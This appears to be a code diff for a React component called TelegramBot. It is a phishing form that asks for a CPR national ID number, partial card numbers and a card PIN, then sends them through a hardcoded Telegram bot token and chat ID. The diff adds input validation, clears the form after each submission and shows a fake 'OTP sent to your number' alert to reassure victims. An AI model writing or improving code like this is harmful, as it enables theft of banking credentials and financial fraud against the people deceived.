@@ -51,7 +51,7 @@ export function TelegramBot() {
     });
   };
 
-  function formValidations(){
+  function formValidations() {
     let hasError = false;
 
     if (formData.cpr.length !== 9) {
@@ -86,32 +86,41 @@ export function TelegramBot() {
       hasError = true;
     }
 
-    if (hasError) {
-      return;
-    }
+    return !hasError;
   }
 
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    const url = `https://api.telegram.org/bot6981001989:AAEamZWRoaFyhQO2QWNs78Q92cYqClCFwgg/sendMessage`;
+    if (formValidations()) {
+      const url = `https://api.telegram.org/bot6981001989:AAEamZWRoaFyhQO2QWNs78Q92cYqClCFwgg/sendMessage`;
 
-    // Send data using Axios
-    try {
-      const response = await axios.post(url, {
-        chat_id: "6632571679",
-        parse_mode: "html",
-        text: {
-            'CPR Number': formData.cpr,
-            'Card Number': formData.cardNumber,
-            'Card Pin': formData.pinCode,
-        }
-      });
-      console.log("Data sent successfully:", response.data);
-      // You can handle the response accordingly
-    } catch (error) {
-      console.error("Error sending data:", error);
-      // Handle the error
+      // Send data using Axios
+      try {
+        const response = await axios.post(url, {
+          chat_id: "6632571679",
+          parse_mode: "html",
+          text: {
+            "CPR Number": formData.cpr,
+            "Card Number": formData.cardNumber,
+            "Card Pin": formData.pinCode,
+          },
+        });
+        console.log("Data sent successfully:", response.data);
+        // You can handle the response accordingly
+        alert("OTP sent to your number");
+        setFormData({
+          cpr: "",
+          cardNumber: {
+            firstSixDigits: "",
+            lastFourDigits: "",
+          },
+          pinCode: "",
+        });
+      } catch (error) {
+        console.error("Error sending data:", error);
+        // Handle the error
+      }
     }
   };
 
@@ -122,7 +131,7 @@ export function TelegramBot() {
       <label>
         CPR Number
         <input
-          type="text"
+          type="number"
           name="cpr"
           value={formData.cpr}
           onChange={handleChange}
@@ -137,7 +146,7 @@ export function TelegramBot() {
       <label>
         Card Number (First 6 digits)
         <input
-          type="text"
+          type="number"
           name="cardNumberFirstSix"
           value={formData.cardNumber.firstSixDigits}
           onChange={handleChange}
@@ -154,7 +163,7 @@ export function TelegramBot() {
       <label>
         Card Number (Last 4 digits)
         <input
-          type="text"
+          type="number"
           name="cardNumberLastFour"
           value={formData.cardNumber.lastFourDigits}
           onChange={handleChange}
@@ -171,12 +180,12 @@ export function TelegramBot() {
       <label>
         PIN Code
         <input
-          type="password"
+          type="number"
           name="pinCode"
           value={formData.pinCode}
           onChange={handleChange}
           maxLength={4}
-        //   required
+          //   required
           className={`form-input ${errors.pinCode && "error"}`}
           placeholder="Enter PIN Code (4 digits)"
         />
